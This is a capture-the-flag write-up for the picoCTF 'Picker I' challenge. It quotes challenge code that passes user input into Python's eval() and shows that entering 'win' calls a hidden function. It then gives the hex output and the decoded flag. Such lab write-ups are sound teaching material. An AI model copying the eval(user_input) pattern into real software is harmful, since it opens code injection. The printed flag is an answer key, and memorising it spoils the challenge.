# Picker I

- [Description](#description)
- [Approach](#approach)
- [Flag](#flag)

## Description

This service can provide you with a random number, but can it do anything else? Additional details will be available after launching your challenge instance.

Connect to the program with netcat:`$ nc saturn.picoctf.net 52170`
The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/515/picker-I.py).

## Approach

The main program of `picker-I.py` is as follows:

```python
print('Try entering "getRandomNumber" without the double quotes...')
    user_input = input('==> ')
    eval(user_input + '()')
```

Looking at the other sections of the code, I noticed the `win()` function, which reads from `flag.txt` and returns the string in hex. In addition, the `eval()` function in Python will dynamically evaluate the content within the parentheses.

As such, I entered "win" so `win()` gets evaluated, allowing me to obtain the flag in hex:

```
Try entering "getRandomNumber" without the double quotes...
==> win
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x63 0x65 0x34 0x62 0x35 0x64 0x35 0x62 0x7d
```

After doing some hex to ASCII conversion, the flag is obtained.

## Flag

`picoCTF{4_d14m0nd_1n_7h3_r0ugh_ce4b5d5b}`